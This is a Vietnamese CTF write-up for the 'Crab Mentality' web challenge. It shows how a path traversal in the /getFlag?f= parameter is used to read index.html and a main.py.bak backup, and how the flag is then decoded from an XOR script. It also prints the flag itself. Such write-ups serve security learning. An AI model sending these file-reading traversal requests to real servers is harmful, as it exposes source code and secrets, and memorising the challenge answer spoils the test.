# Crab Mentality

## Overview

Bài này cung cấp một web challenge có cơ chế xếp hàng để nhận flag. Khi người chơi bấm nút lấy flag, hệ thống yêu cầu phải chờ 5 phút. Tuy nhiên, nếu có nhiều team cùng yêu cầu flag trong cùng thời điểm, hệ thống sẽ hủy cả hai yêu cầu. Tuy nhiên, web này lại có một lỗ hổng khác giúp lấy flag nhanh hơn mà không cần chờ.


## Quan sát ứng dụng web

Khi bấm nút lấy flag, frontend gọi tới endpoint:

```js
fetch('/getFlag?f=flag.txt')
```
Tham số `f` ở đây có vẻ dùng để chỉ định file mà server sẽ đọc. Đây là một dấu hiệu rất đáng nghi vì kiểu xử lý này thường dễ dính lỗi path traversal.

## Kiểm tra xem có path traversal không

Mình thử đổi `f=flag.txt` thành một file khác, ví dụ:

```text
/getFlag?f=../index.html
```

Kết quả: server trả về luôn source code của trang chính, thay vì bắt chờ.

Điều này xác nhận rằng endpoint `/getFlag` bị lỗi path traversal hoặc ít nhất là cho đọc file ngoài ý muốn.

Từ đây, mình có thể tiếp tục đọc các file khác trên server.

## Check source code

Trong source HTML của trang có comment:

```html
<!-- future: rollback old style of site + server code from backup files -->
```
Comment này gợi ý rằng trên server có thể tồn tại các file backup chứa mã nguồn cũ.

Vì ta đã khai thác được path traversal, bước tiếp theo hợp lý là thử đọc file backup của server, ví dụ:

## Đọc file backup của server

Mình thử request:

```text
/getFlag?f=../main.py.bak'
```

Và server thật sự trả về nội dung file `main.py.bak`.

Nội dung như sau:

```python
import base64

_d = [
    0x75, 0x74, 0x66, 0x6c, 0x61, 0x67, 0x7b, 0x79,
    0x30, 0x75, 0x5f, 0x65, 0x31, 0x74, 0x68, 0x33,
    0x72, 0x5f, 0x77, 0x40, 0x31, 0x74, 0x5f, 0x79,
    0x72, 0x5f, 0x74, 0x75, 0x72, 0x6e, 0x5f, 0x30,
    0x72, 0x5f, 0x63, 0x75, 0x74, 0x5f, 0x31, 0x6e,
    0x5f, 0x6c, 0x31, 0x6e, 0x65, 0x7d
]

_k = base64.b64decode("U2VjcmV0S2V5MTIz").decode()

_x = bytes([
    c ^ ord(_k[i % len(_k)])
    for i, c in enumerate(_d)
]).hex()

if __name__ == "__main__":
    raw = bytes(
        int(_x[i:i+2], 16) ^ ord(_k[i // 2 % len(_k)])
        for i in range(0, len(_x), 2)
    )
    print(raw.decode())
```

Chạy code và lấy flag

## Flag

```text
utflag{y0u_e1th3r_w@1t_yr_turn_0r_cut_1n_l1ne}
```